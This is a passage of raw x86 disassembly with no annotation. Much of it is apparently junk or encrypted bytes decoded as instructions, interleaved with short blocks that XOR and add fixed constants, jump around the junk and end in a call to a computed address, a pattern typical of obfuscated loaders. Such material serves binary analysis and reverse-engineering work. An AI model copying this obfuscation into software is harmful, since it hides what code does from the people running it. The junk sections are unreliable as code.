  40215b:	jno    0x4020ec
  40215d:	loopne 0x4020ea
  40215f:	dec    esp
  402160:	std    
  402161:	mov    edi,0x9d630230
  402166:	pop    edx
  402167:	mov    cl,0x7f
  402169:	or     al,0x24
  40216c:	lds    esp,FWORD PTR [ebp+ecx*2-0x73d8edd8]
  402173:	imul   esi,ebx,0x1c2f0adf
  402179:	push   es
  40217a:	ja     0x40212a
  40217c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40217d:	adc    eax,0xfed1c963
  402182:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402183:	bound  ebx,QWORD PTR [ebx+0x50ec958e]
  402189:	or     eax,0xdc1e7f43
  40218e:	jb     0x402137
  402190:	shr    DWORD PTR [esi],cl
  402192:	push   ebx
  402193:	gs leave 
  402195:	iret   
  402196:	repz popa 
  402198:	mov    eax,DWORD PTR [ebp-0x20]
  40219b:	inc    edi
  40219c:	cmp    edi,eax
  40219e:	jb     0x401676
  4021a4:	jmp    0x402298
  4021a9:	mov    eax,DWORD PTR [ebp-0x4]
  4021ac:	xor    eax,esi
  4021ae:	add    eax,ebx
  4021b0:	jmp    0x402c24
  4021b5:	mov    eax,DWORD PTR [ebp-0x2c]
  4021b8:	movzx  eax,WORD PTR [eax+edi*2]
  4021bc:	mov    ecx,DWORD PTR [ebp-0x14]
  4021bf:	mov    eax,DWORD PTR [ecx+eax*4]
  4021c2:	jmp    0x402295
  4021c7:	lods   eax,DWORD PTR ds:[esi]
  4021c8:	adc    ah,BYTE PTR [edi+0x7d7da75f]
  4021ce:	jmp    0x242:0xa7f835f7
  4021d5:	cdq    
  4021d6:	pop    esp
  4021d7:	xchg   esi,eax
  4021d8:	jbe    0x402256
  4021da:	jl     0x40217e
  4021dc:	jl     0x40225a
  4021de:	jl     0x4021b0
  4021e0:	mov    ecx,eax
  4021e2:	repz mov edx,DWORD PTR [esi-0x5736baa9]
  4021e9:	mov    cl,0x91
  4021eb:	aad    0x43
  4021ed:	inc    edi
  4021ee:	xchg   ebp,eax
  4021ef:	push   0x3d6dd74f
  4021f4:	fistp  WORD PTR [edi]
  4021f6:	sub    edi,DWORD PTR [esi]
  4021f8:	test   al,0x83
  4021fa:	xor    al,0x78
  4021fc:	mov    ebp,esp
  4021fe:	push   edi
  4021ff:	push   edi
  402200:	sbb    cl,dl
  402202:	repnz lods eax,DWORD PTR ds:[esi]
  402204:	and    BYTE PTR [ebx],0xed
  402207:	adc    BYTE PTR [edi+0x1f08f5b9],0x59
  40220e:	addr16 mov edx,0x7541f542
  402214:	fistp  DWORD PTR [ebp+0xc]
  402217:	mov    ebp,esp
  402219:	ss stc 
  40221b:	outs   dx,DWORD PTR ds:[esi]
  40221c:	mov    es,WORD PTR [ecx+0x2a5a87ff]
  402222:	adc    BYTE PTR [ebx-0x1d],bh
  402225:	push   edx
  402227:	daa    
  402228:	outs   dx,BYTE PTR ds:[esi]
  402229:	pmaxub mm4,QWORD PTR [edx-0x78]
  40222d:	pop    esp
  40222e:	push   edx
  40222f:	dec    edx
  402230:	jno    0x402204
  402232:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402233:	xchg   edx,eax
  402234:	xchg   edx,eax
  402235:	pop    ecx
  402236:	xor    BYTE PTR [ebx],al
  402238:	mov    ecx,0x8b1bb8fc
  40223d:	dec    edi
  40223e:	xchg   esi,esp
  402240:	ss xor cl,cl
  402243:	sub    al,0xc
  402245:	aam    0xb9
  402247:	mov    esp,ecx
  402249:	and    DWORD PTR [edi],0xfffffff1
  40224c:	pop    es
  40224d:	xor    dl,dh
  40224f:	fiadd  DWORD PTR [eax]
  402251:	neg    BYTE PTR [esi+eax*8]
  402254:	xchg   BYTE PTR [ebx+0x50a074b1],dh
  40225a:	fwait
  40225b:	iret   
  40225c:	dec    edx
  40225d:	xor    al,0xd1
  40225f:	enter  0xf641,0x8a
  402263:	dec    edi
  402264:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402265:	or     eax,0x859e1ead
  40226a:	inc    edx
  40226b:	nop
  40226c:	aas    
  40226d:	dec    edx
  40226e:	push   ds
  40226f:	hlt    
  402270:	cwde   
  402271:	xchg   ebp,eax
  402272:	jo     0x402270
  402274:	sbb    BYTE PTR [ebp-0x231e74e5],0x1d
  40227b:	push   ss
  40227c:	push   esp
  40227d:	std    
  40227e:	push   esp
  40227f:	adc    BYTE PTR [edx+0x8],0x92
  402283:	dec    esp
  402284:	lds    ecx,FWORD PTR [edx+0x54]
  402287:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402288:	mov    esp,DWORD PTR [ebx+0x2fe9b9a6]
  40228e:	or     dh,0xe3
  402291:	fst    QWORD PTR [ebp+0x45891d64]
  402297:	or     al,0x8b
  402299:	inc    ebp
  40229a:	cld    
  40229b:	mov    ecx,DWORD PTR [ebp-0x8]
  40229e:	jmp    0x402371
  4022a3:	xchg   ebx,eax
  4022a4:	sub    al,BYTE PTR [esp+eax*1]
  4022a7:	cdq    
  4022a8:	cmp    dl,BYTE PTR [ebx+0x426f4fbd]
  4022ae:	mov    dh,0x76
  4022b0:	mov    ebx,0x9dc6062
  4022b5:	jl     0x402333
  4022b7:	mov    ds:0xc57c7c7c,al
  4022bc:	push   ss
  4022bd:	scas   al,BYTE PTR es:[edi]
  4022be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4022bf:	mov    ds:0x516df7a5,eax
  4022c4:	sub    BYTE PTR [edi],0xb0
  4022c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4022c8:	loope  0x4022a5
  4022ca:	cmp    al,0xa9
  4022cc:	push   0x43
  4022ce:	mov    edi,0x596af5e1
  4022d3:	jmp    0x3ca1:0x3360e2ed
  4022da:	lahf   
  4022db:	pop    ebx
  4022dc:	pop    ebx
  4022dd:	and    cl,BYTE PTR [eax]
  4022df:	call   0x7626:0x66beba8c
  4022e6:	cmp    edx,DWORD PTR [edx-0x32521986]
  4022ec:	out    0x54,al
  4022ee:	mov    fs,WORD PTR [edx-0x3ace7075]
  4022f4:	sub    DWORD PTR [ecx],0x52
  4022f7:	mov    esi,0x4b9211b3
  4022fc:	xchg   bl,ah
  4022fe:	fsub   st(4),st
  402300:	add    eax,0xb65c30ff
  402305:	in     al,dx
  402306:	mov    ah,0x0
  402308:	out    0x94,al
  40230a:	inc    esp
  40230b:	xchg   esi,eax
  40230c:	out    0xec,al
  40230e:	lods   al,BYTE PTR ds:[esi]
  40230f:	pop    edx
  402310:	xchg   DWORD PTR [edx-0x312d51e9],esi
  402316:	hlt    
  402317:	fistp  QWORD PTR [ecx]
  402319:	mov    cl,0x8f
  40231b:	push   edi
  40231c:	aam    0x29
  40231e:	into   
  40231f:	aaa    
  402320:	jne    0x402314
  402322:	push   edi
  402323:	jp     0x402343
  402325:	xchg   DWORD PTR [ebp+0x25],edx
  402328:	fdivrp st(1),st
  40232a:	test   al,0x8b
  40232c:	jl     0x4022b2
  40232e:	mov    ?,WORD PTR [ebx+0x1efe190b]
  402334:	add    DWORD PTR [esi+0x61e3403c],ebp
  40233a:	add    edx,ecx
  40233c:	sub    ebx,eax
  40233e:	mov    ebx,0x413d0fd2
  402343:	lahf   
  402344:	clc    
  402345:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402346:	les    edx,FWORD PTR [ebp-0x26d91aed]
  40234c:	popf   
  40234d:	pop    ecx
  40234e:	jle    0x40236a
  402350:	rcr    DWORD PTR [eax],0xb0
  402353:	pop    ss
  402354:	das    
  402355:	ss mov esp,gs
  402358:	int3   
  402359:	push   ecx
  40235a:	lods   al,BYTE PTR ds:[esi]
  40235b:	jne    0x402388
  40235d:	push   ebp
  40235e:	cdq    
  40235f:	in     al,dx
  402360:	ror    DWORD PTR [ecx],1
  402362:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402363:	sub    eax,esi
  402365:	retf   
  402366:	cdq    
  402367:	sbb    dh,BYTE PTR [ebp+ebx*8+0x427621aa]
  40236e:	fidiv  DWORD PTR [edx]
  402370:	xlat   BYTE PTR ds:[ebx]
  402371:	xor    eax,0x7510857
  402376:	add    eax,ebx
  402378:	cmp    ecx,eax
  40237a:	jne    0x40238d
  402380:	mov    eax,DWORD PTR [ebp-0x4]
  402383:	xor    eax,0x7510857
  402388:	jmp    0x4021ae
  40238d:	mov    eax,DWORD PTR [ebp+0xc]
  402390:	add    eax,DWORD PTR [ebp+0x8]
  402393:	mov    DWORD PTR [ebp-0x10],eax
  402396:	mov    eax,DWORD PTR [ebp-0x1c]
  402399:	test   eax,eax
  40239b:	je     0x4026e4
  4023a1:	mov    DWORD PTR [ebp-0x24],esi
  4023a4:	push   0xb
  4023a6:	pop    ecx
  4023a7:	push   0x5
  4023a9:	dec    ecx
  4023aa:	pop    ebx
  4023ab:	xchg   ebx,ecx
  4023ad:	sub    ebx,ecx
  4023af:	xchg   ebx,ecx
  4023b1:	dec    ecx
  4023b2:	mov    eax,DWORD PTR [ebp-0x1c]
  4023b5:	imul   eax,ecx
  4023b8:	sub    esp,eax
  4023ba:	mov    DWORD PTR [ebp-0x24],esp
  4023bd:	mov    eax,DWORD PTR [ebp-0x4]
  4023c0:	mov    ecx,0x7510857
  4023c5:	xor    eax,ecx
  4023c7:	mov    edx,0x32729e
  4023cc:	add    eax,edx
  4023ce:	mov    DWORD PTR [ebp+0x8],eax
  4023d1:	jmp    0x4024a4
  4023d6:	cmp    dl,BYTE PTR [esi+0x7b653be5]
  4023dc:	cli    
  4023dd:	test   eax,0x3babd173
  4023e2:	push   0x34
  4023e4:	mov    ch,0x42
  4023e6:	add    cl,BYTE PTR [eax]
  4023e8:	jl     0x402466
  4023ea:	mov    ds:0xf87c7c7c,al
  4023ef:	cmp    DWORD PTR [ebp-0x6c7124d9],esi
  4023f5:	(bad)  
  4023f6:	jb     0x4023c9
  4023f8:	mul    dl
  4023fa:	lahf   
  4023fb:	clc    
  4023fc:	add    BYTE PTR [esi-0x45],0x44
  402400:	out    dx,al
  402401:	cmp    BYTE PTR [ebp-0x7b],bh
  402404:	or     al,0xef
  402406:	in     al,0xaa
  402408:	leave  
  402409:	jg     0x40246e
  40240b:	mov    edi,0x599ffd3f
  402410:	or     al,0xdf
  402412:	mov    ds:0xe9e17e54,al
  402417:	ficomp DWORD PTR [edx+0x2f]
  40241a:	or     ebx,DWORD PTR [ebp-0x7e758ee2]
  402420:	mov    ds:0xabe04d67,al
  402425:	add    eax,0xe0b52a83
  40242a:	mov    esi,0xdc4f3afa
  40242f:	fs cld 
  402431:	fcomip st,st(2)
  402433:	jns    0x402420
  402435:	push   ebp
  402436:	mov    esp,0x36e3c602
  40243b:	dec    ebp
  40243c:	xlat   BYTE PTR ds:[ebx]
  40243d:	(bad)
  402441:	pop    ebp
  402442:	mov    bl,0x9c
  402444:	push   eax
  402445:	ret    
  402446:	psllw  mm5,QWORD PTR [ebx-0x37834dae]
  40244d:	jmp    0x6d7d:0xc0e52f2b
  402454:	push   edx
  402455:	popa   
  402456:	inc    ecx
  402457:	fidiv  DWORD PTR [esi+0x4d]
  40245a:	push   0xfffffff0
  40245c:	jnp    0x402497
  40245e:	push   ebp
  40245f:	idiv   ah
  402461:	sub    eax,0x3da1272d
  402466:	push   0xbe1b62f4
  40246b:	inc    edx
  40246c:	mov    eax,0x6479b50f
  402471:	xor    eax,0xd2e96d87
  402476:	je     0x4024c0
  402478:	fcom   st(2)
  40247a:	jge    0x89f12950
  402480:	(bad)  
  402481:	in     al,0xb1
  402483:	or     ecx,edi
  402485:	push   ebp
  402486:	cmc    
  402487:	push   eax
  402488:	out    0x7a,eax
  40248a:	cwde   
  40248b:	lea    esp,[edi]
  40248d:	xor    DWORD PTR [bx+di],ebx
  402490:	cmp    al,0xd1
  402492:	jg     0x402510
  402494:	jge    0x4024b1
  402496:	mov    edx,0x7a1f05af
  40249b:	xchg   esi,eax
  40249c:	xchg   esp,eax
  40249d:	inc    esp
  40249e:	sbb    DWORD PTR [edx],edi
  4024a0:	adc    ebp,DWORD PTR [ebx-0x53]
  4024a3:	das    
  4024a4:	mov    eax,DWORD PTR [ebp-0x18]
  4024a7:	xor    eax,ecx
  4024a9:	add    eax,edx
  4024ab:	mov    edx,DWORD PTR [ebp+0x14]
  4024ae:	jmp    0x402581
  4024b3:	and    al,0x81
  4024b5:	rep ins BYTE PTR es:[edi],dx
  4024b7:	lods   eax,DWORD PTR ds:[esi]
  4024b8:	(bad)  
  4024b9:	sti    
  4024ba:	pop    ecx
  4024bb:	xor    DWORD PTR [ebx],0x96fdbfae
  4024c1:	inc    eax
  4024c2:	xchg   edx,eax
  4024c3:	dec    eax
  4024c4:	or     BYTE PTR [esp+edi*2-0x5e],bh
  4024c8:	jl     0x402546
  4024ca:	jl     0x402535
  4024cc:	mov    esp,0x703c4798
  4024d1:	enter  0xd0ca,0xeb
  4024d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4024d6:	test   DWORD PTR [edx],ecx
  4024d8:	jmp    0x6b9d:0xc398a3a6
  4024df:	adc    eax,0x55587cde
  4024e4:	cmp    eax,0x2285e8b7
  4024e9:	dec    edi
  4024ea:	cld    
  4024eb:	leave  
  4024ec:	pop    edx
  4024ed:	pop    es
  4024ee:	or     al,0xac
  4024f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4024f1:	dec    esp
  4024f2:	mov    eax,0x7efd924d
  4024f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024f8:	xchg   edi,eax
  4024f9:	mov    esp,DWORD PTR [eax+0x5f2e5fc2]
  4024ff:	and    BYTE PTR [ebx+0x237868c8],dh
  402505:	fs dec ebp
  402507:	test   BYTE PTR [ebx+edi*4],ah
  40250a:	shr    DWORD PTR ds:[edx+0x61],1
  40250e:	cwde   
  40250f:	push   ss
  402510:	xchg   esp,eax
  402511:	mov    ebx,0xe96206ab
  402516:	stc    
  402517:	mov    DWORD PTR [esi+0x41],esi
  40251a:	lds    ecx,FWORD PTR [edi-0x71]
  40251d:	mov    ds:0xc44d084,al
  402522:	push   es
  402523:	inc    edx
  402524:	les    ebp,FWORD PTR [esi+0xd544cd4]
  40252a:	and    eax,0xd850102c
  40252f:	cmp    ecx,DWORD PTR [esi+edx*4-0x6b]
  402533:	add    ch,BYTE PTR [esi]
  402535:	mov    edi,0x6b86c72b
  40253a:	jecxz  0x40257a
  40253c:	dec    esp
  40253d:	js     0x4024d7
  40253f:	je     0x40256d
  402541:	jge    0x4024ee
  402543:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402544:	outs   dx,BYTE PTR ds:[esi]
  402545:	mov    ?,WORD PTR [ebp-0x6d]
  402548:	out    dx,eax
  402549:	push   edx
  40254a:	mov    WORD PTR [ebx+0x3bf32981],es
  402550:	push   edx
  402551:	enter  0x85ee,0x54
  402555:	test   cl,ah
  402557:	push   eax
  402558:	pop    ecx
  402559:	add    al,0x47
  40255b:	pop    es
  40255c:	sub    bl,BYTE PTR [ebp-0x40]
  40255f:	ins    BYTE PTR es:[edi],dx
  402560:	test   eax,0x81a065a1
  402565:	repz and al,0xf9
  402568:	ret    0x11a5
  40256b:	add    BYTE PTR [eax],0x7
  40256e:	adc    BYTE PTR [esi],dh
  402570:	mov    edx,0x325b328e
  402575:	dec    esi
  402576:	mov    cl,BYTE PTR [ebp+ebx*8+0x60d404b7]
  40257d:	les    eax,FWORD PTR [esi-0x53]
  402580:	xchg   ebx,eax
  402581:	imul   eax,DWORD PTR [edx]
  402584:	mov    edx,DWORD PTR [ebp-0x4]
  402587:	xor    edx,ecx
  402589:	mov    ecx,DWORD PTR [ebp+0x8]
  40258c:	lea    ecx,[edx+ecx*1+0x32729e]
  402593:	cmp    ecx,eax
  402595:	je     0x4026df
  40259b:	mov    edi,DWORD PTR [ebp-0x18]
  40259e:	mov    eax,DWORD PTR [ebp+0x8]
  4025a1:	mov    edx,DWORD PTR [ebp+0x14]
  4025a4:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4025a8:	mov    ecx,0x7510857
  4025ad:	xor    edx,edx
  4025af:	xor    edi,ecx
  4025b1:	mov    esi,0x32729e
  4025b6:	add    edi,esi
  4025b8:	div    edi
  4025ba:	mov    edx,DWORD PTR [ebp-0x4]
  4025bd:	xor    edx,ecx
  4025bf:	lea    eax,[edx+eax*1+0x32729e]
  4025c6:	mov    edx,DWORD PTR [ebp+0x8]
  4025c9:	mov    edi,DWORD PTR [ebp-0x24]
  4025cc:	mov    DWORD PTR [edi+edx*4],eax
  4025cf:	mov    eax,DWORD PTR [ebp-0x18]
  4025d2:	mov    edx,DWORD PTR [ebp+0x8]
  4025d5:	xor    eax,ecx
  4025d7:	lea    eax,[eax+edx*1+0x32729e]
  4025de:	mov    DWORD PTR [ebp+0x8],eax
  4025e1:	mov    eax,DWORD PTR [ebp-0x18]
  4025e4:	mov    edx,DWORD PTR [ebp+0x14]
  4025e7:	xor    eax,ecx
  4025e9:	add    eax,esi
  4025eb:	imul   eax,DWORD PTR [edx]
  4025ee:	mov    edx,DWORD PTR [ebp-0x4]
  4025f1:	xor    edx,ecx
  4025f3:	mov    ecx,DWORD PTR [ebp+0x8]
  4025f6:	lea    ecx,[edx+ecx*1+0x32729e]
  4025fd:	cmp    ecx,eax
  4025ff:	jne    0x40259b
  402605:	jmp    0x4026d8
  40260a:	xlat   BYTE PTR ds:[ebx]
  40260b:	pop    esp
  40260c:	cmp    DWORD PTR [eax-0x47],eax
  40260f:	pop    ebp
  402610:	ins    DWORD PTR es:[edi],dx
  402611:	jnp    0x4025e8
  402613:	sbb    ch,bl
  402615:	mov    ebp,esp
  402617:	push   0x50
  402619:	pop    esi
  40261a:	dec    BYTE PTR [ebx]
  40261c:	jl     0x40269a
  40261e:	mov    ds:0xf57c7c7c,al
  402623:	push   esi
  402624:	xlat   BYTE PTR ds:[ebx]
  402625:	lods   eax,DWORD PTR ds:[esi]
  402626:	in     al,0x17
  402628:	push   0xffffffb9
  40262a:	push   ecx
  40262b:	mov    eax,DWORD PTR [eax]
  40262d:	mov    ecx,0xe795f6d6
  402632:	push   esi
  402633:	mov    bl,0xa0
  402635:	mov    ah,0x5c
  402637:	mov    WORD PTR [edi],ax
  40263a:	pop    ss
  40263b:	dec    ebx
  40263c:	xor    cl,ch
  40263e:	sbb    DWORD PTR [ecx-0x142a042e],ebx
  402644:	das    
  402645:	and    al,BYTE PTR [esi+0x2b]
  402648:	xchg   edx,eax
  402649:	fld    TBYTE PTR [eax+0x78c2d58b]
  40264f:	cli    
  402650:	xor    edi,edi
  402652:	fcom   QWORD PTR [edx-0x1762cd88]
  402658:	fs or  al,0x71
  40265b:	dec    ecx
  40265c:	mov    esi,0xe383b940
  402661:	pop    esi
  402662:	ficom  DWORD PTR [ebp+0x37]
  402665:	(bad)  
  402666:	cmp    ax,WORD PTR [edx+ecx*4-0x1a69e762]
  40266e:	adc    ecx,DWORD PTR [eax]
  402670:	xor    eax,0x49a53747
  402675:	or     BYTE PTR [ecx],ah
  402677:	in     eax,0xc4
  402679:	cwde   
  40267a:	lds    esi,FWORD PTR [edx-0x2c]
  40267d:	mov    ebx,DWORD PTR [ebp+0x7a]
  402680:	addr16 pop ecx
  402682:	xor    edx,DWORD PTR ds:0x6a1e0f1c
  402688:	sti    
  402689:	gs inc esi
  40268b:	retf   
  40268c:	adc    eax,0x57c922d9
  402691:	fs add al,0x5
  402694:	pop    esp
  402695:	or     bl,BYTE PTR [eax+0x44]
  402698:	inc    esp
  402699:	mov    ch,0x99
  40269b:	xor    esi,DWORD PTR [eax-0x757d538]
  4026a1:	sub    eax,0xe54e0482
  4026a6:	aam    0x4e
  4026a8:	mov    edi,0x56427f17
  4026ad:	ds scas eax,DWORD PTR es:[edi]
  4026af:	test   eax,0x815672a6
  4026b4:	retf   
  4026b5:	and    BYTE PTR [ebx-0x7a],0xd8
  4026b9:	adc    ch,BYTE PTR [ebx-0x44]
  4026bc:	das    
  4026bd:	shl    BYTE PTR [esi],cl
  4026bf:	dec    edx
  4026c0:	fidiv  WORD PTR [edx+0x44e1c1d4]
  4026c6:	dec    eax
  4026c7:	push   eax
  4026c8:	rcl    BYTE PTR [edi+eax*2-0x12],cl
  4026cc:	fwait
  4026cd:	and    bh,dh
  4026cf:	hlt    
  4026d0:	sbb    bl,BYTE PTR [edi]
  4026d2:	pop    es
  4026d3:	cli    
  4026d4:	imul   ebx,DWORD PTR [ecx+eiz*8],0xffffffda
  4026d8:	mov    ebx,esi
  4026da:	jmp    0x4026e4
  4026df:	mov    ebx,0x32729e
  4026e4:	mov    eax,DWORD PTR [ebp-0x4]
  4026e7:	xor    eax,0x7510857
  4026ec:	jmp    0x4027bf
  4026f1:	(bad)  
  4026f2:	fsubr  st(2),st
  4026f4:	mov    esp,0x647a42fa
  4026f9:	clc    
  4026fa:	(bad)  
  4026fb:	mov    WORD PTR [ecx-0x5d],?
  4026fe:	mov    dh,cl
  402700:	stc    
  402701:	and    al,0xa
  402703:	jl     0x402781
  402705:	mov    ds:0x1a7c7c7c,al
  40270a:	dec    ebx
  40270b:	fld    DWORD PTR [ebx-0x62]
  40270e:	push   eax
  40270f:	shl    BYTE PTR [ebx+0x2b],0xa6
  402713:	or     dh,bl
  402715:	pop    es
  402716:	cmp    DWORD PTR [eax+edi*2-0x6f],ebp
  40271a:	out    0x87,al
  40271c:	dec    esi
  40271d:	iret   
  40271e:	xchg   BYTE PTR [ecx+0x4843596b],ch
  402724:	mov    ebx,0x7cae60c9
  402729:	bound  ebp,QWORD PTR [esi]
  40272b:	jl     0x402717
  40272d:	xchg   esp,eax
  40272e:	fimul  DWORD PTR [edx+0xed4224f]
  402734:	fidivr DWORD PTR [esi+0x65732367]
  40273a:	mov    ebp,0x6baf802c
  40273f:	(bad)
  402743:	mov    eax,0xed0a3dc0
  402748:	cmp    al,0x21
  40274a:	repnz push eax
  40274c:	pop    ebp
  40274d:	sbb    eax,0xc21897e6
  402752:	xor    DWORD PTR [ebx+0x4b87541d],0xffffff9d
  402759:	mov    eax,ds:0x9869e225
  40275e:	ret    
  40275f:	push   edx
  402760:	fwait
  402761:	leave  
  402762:	and    BYTE PTR ds:0x15f9864a,dh
  402768:	add    eax,DWORD PTR [edi]
  40276a:	jb     0x4026f4
  40276c:	push   cs
  40276d:	mov    ds:0xae10dd6d,eax
  402772:	shr    DWORD PTR [eax+0x40],cl
  402775:	xchg   ch,bh
  402777:	rcr    DWORD PTR [esi],0x17
  40277a:	or     BYTE PTR [ecx+0x38],dl
  40277d:	lock sub eax,0x85cc78ab
  402783:	lahf   
  402784:	std    
  402785:	repz xor ah,BYTE PTR [ecx+0x3cfd4bd9]
  40278c:	in     al,0x53
  40278e:	push   edx
  40278f:	arpl   WORD PTR [edx-0x56],bx
  402792:	cmp    al,0x1
  402794:	or     BYTE PTR [edi],ah
  402796:	push   0x51abaf32
  40279b:	push   eax
  40279c:	add    eax,0xb2b9e471
  4027a1:	pop    edi
  4027a2:	bound  edi,QWORD PTR ds:0x9edc125
  4027a8:	cmp    edi,DWORD PTR [ecx*4-0x636b1f34]
  4027af:	mov    edx,0x6c139a85
  4027b4:	inc    edi
  4027b5:	cmp    eax,0x5d6529e5
  4027ba:	out    dx,eax
  4027bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027bc:	fdivr  QWORD PTR [ebx-0x763cfca1]
  4027c2:	inc    ebp
  4027c3:	hlt    
  4027c4:	jmp    0x402897
  4027c9:	pop    ebp
  4027ca:	fimul  WORD PTR [ebp+eiz*8+0x567d65bb]
  4027d1:	cdq    
  4027d2:	push   es
  4027d3:	mov    si,0x2984
  4027d7:	inc    ebp
  4027d8:	pop    edi
  4027d9:	push   0xa
  4027db:	jl     0x402859
  4027dd:	mov    ds:0xb07c7c7c,al
  4027e2:	or     eax,0x34445f6
  4027e7:	pop    eax
  4027e8:	push   0xe76cecd3
  4027ed:	int3   
  4027ee:	adc    al,0xd8
  4027f0:	popa   
  4027f1:	pop    ss
  4027f2:	mov    eax,0xcbcfbd5f
  4027f7:	jbe    0x40280b
  4027f9:	jge    0x40277c
  4027fb:	ror    DWORD PTR [edx+0x62],0xe2
  4027ff:	rol    BYTE PTR [edi+esi*4-0x63],0xe
  402804:	add    eax,0x53794989
  402809:	xor    esi,DWORD PTR [edi-0x431e60e]
  40280f:	jae    0x40279a
  402811:	mov    edi,0xab827f77
  402816:	mov    edx,0x7e58b6e1
  40281b:	imul   edi,eax,0xf88ac1a6
  402821:	int    0x65
  402823:	mov    edx,0x9f38ab12
  402828:	sbb    eax,0x3efd855b
  40282d:	shl    DWORD PTR [eax+0x59],cl
  402830:	sbb    eax,0xf709cecd
  402835:	pop    ds
  402836:	js     0x402836
  402838:	pop    es
  402839:	pop    edx
  40283a:	daa    
  40283b:	add    eax,0x97595c5e
  402840:	(bad)  
  402841:	push   ecx
  402842:	cli    
  402843:	pop    esi
  402844:	and    al,0x75
  402846:	mov    al,ds:0x4d9622b7
  40284b:	sbb    ebx,edx
  40284d:	cs jg  0x402826
  402850:	pop    edi
  402851:	pop    eax
  402852:	enter  0xb42a,0x28
  402856:	pop    ebp
  402857:	out    dx,eax
  402858:	mov    ebp,0x4093ffb
  40285d:	dec    esp
  40285e:	outs   dx,BYTE PTR ds:[esi]
  40285f:	push   esi
  402860:	mov    DWORD PTR [edi],edi
  402862:	cmp    DWORD PTR [eax-0x540ba9b9],ebx
  402868:	mov    ds:0xb8cbed4f,al
  40286d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40286e:	jbe    0x402848
  402870:	push   edx
  402871:	out    0xa2,al
  402873:	push   esp
  402874:	and    al,0xf4
  402876:	test   DWORD PTR [ecx],ebp
  402878:	punpckldq mm6,mm4
  40287b:	mov    edx,0xfa12cbed
  402880:	pop    ebx
  402881:	jo     0x402878
  402883:	aaa    
  402884:	mov    esp,0xdcdbbfb8
  402889:	xor    BYTE PTR [eax+0x21],dl
  40288c:	jno    0x4028d4
  40288e:	push   ebx
  40288f:	int    0x86
  402891:	scas   eax,DWORD PTR es:[edi]
  402892:	jle    0x40290e
  402894:	cwde   
  402895:	add    DWORD PTR [edi],ecx
  402897:	xor    ebx,ebx
  402899:	lea    eax,[ebp-0x10]
  40289c:	add    ebx,DWORD PTR [eax]
  40289e:	call   ebx
  4028a0:	xor    ebx,ebx
  4028a2:	inc    ebx
  4028a3:	cmp    DWORD PTR [ebp+0x10],ebx
  4028a6:	jmp    0x402979
  4028ab:	jmp    0x4028ef
  4028ad:	inc    esp
  4028ae:	ins    BYTE PTR es:[edi],dx
  4028af:	jns    0x40292b
  4028b1:	jmp    0x402910
  4028b3:	loope  0x40292e
  4028b5:	pushf  
  4028b6:	adc    BYTE PTR [ebx+edi*2+0xd9041b2],0x7c
  4028be:	jl     0x402862
  4028c0:	jl     0x40293e
  4028c2:	jl     0x4028d1
  4028c4:	out    dx,eax
  4028c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4028c6:	sbb    DWORD PTR [ecx+0x44],eax
  4028c9:	mov    esi,0xe33fc02b
  4028ce:	test   al,0x6
  4028d0:	xchg   ebx,eax
  4028d1:	sbb    edi,DWORD PTR [edx]
  4028d3:	and    edx,DWORD PTR [eax]
  4028d5:	stos   DWORD PTR es:[edi],eax
  4028d6:	retf   
  4028d7:	adc    DWORD PTR [ebp-0x76],edx
  4028da:	shl    DWORD PTR [edx+0x65e592c],cl
  4028e0:	es dec esp
  4028e2:	imul   edi,DWORD PTR gs:[ecx+0x23],0xffffffc7
  4028e7:	mov    ebx,eax
  4028e9:	addr16 push edi
  4028eb:	shr    DWORD PTR [eax-0x75],cl
  4028ee:	mov    ebx,0xb1eb5a9a
  4028f3:	pop    ds
  4028f4:	leave  
  4028f5:	jb     0x4028c2
  4028f7:	sbb    dl,BYTE PTR [edi+0x3e]
  4028fa:	cmp    eax,0xd38c706c
  4028ff:	or     al,0x9c
  402901:	std    
  402902:	adc    ch,bh
  402904:	cli    
  402905:	cmp    dl,BYTE PTR [eax-0x10]
  402908:	sahf   
  402909:	sti    
  40290a:	mov    edx,0x7dcf6d94
  40290f:	or     DWORD PTR [edi+0x4e],esi
  402912:	cdq    
  402913:	and    eax,0x8fad581d
  402918:	out    dx,al
  402919:	test   BYTE PTR [ebx+0x58],al
  40291c:	jl     0x40294a
  40291e:	mov    bl,0x33
  402920:	popa   
  402921:	popf   
  402922:	cli    
  402923:	sub    esp,ecx
  402925:	loop   0x4028e1
  402927:	mov    DWORD PTR [edx+eax*4],0xa6f7a652
  40292e:	xchg   ebp,eax
  40292f:	mov    al,ds:0xf5f72691
  402934:	and    bl,BYTE PTR [edx]
  402936:	ins    BYTE PTR es:[edi],dx
  402937:	(bad)  
  402938:	ja     0x40292b
  40293a:	rol    DWORD PTR [eax],1
  40293c:	push   ebx
  40293d:	mov    esi,0x95b8d938
  402942:	or     ah,BYTE PTR [esi+0x18]
  402945:	cmp    BYTE PTR [ecx],cl
  402947:	cmp    eax,0x2f671c8f
  40294c:	fimul  WORD PTR [edx+esi*4+0x28]
  402950:	cli    
  402951:	aaa    
  402952:	stc    
  402953:	xor    eax,0x6bcd6bfe
  402958:	scas   eax,DWORD PTR es:[edi]
  402959:	dec    ebx
  40295a:	inc    esi
  40295b:	mov    bx,WORD PTR [eax]
  40295e:	sahf   
  40295f:	push   0xffffffc9
  402961:	out    dx,eax
  402962:	xchg   ebp,eax
  402963:	shl    DWORD PTR [edx-0x175270b0],0x4f
  40296a:	addr16 xchg ecx,eax
  40296c:	repnz or esi,DWORD PTR [eax+0x4b]
  402970:	test   eax,0x679c081e
  402975:	inc    ebp
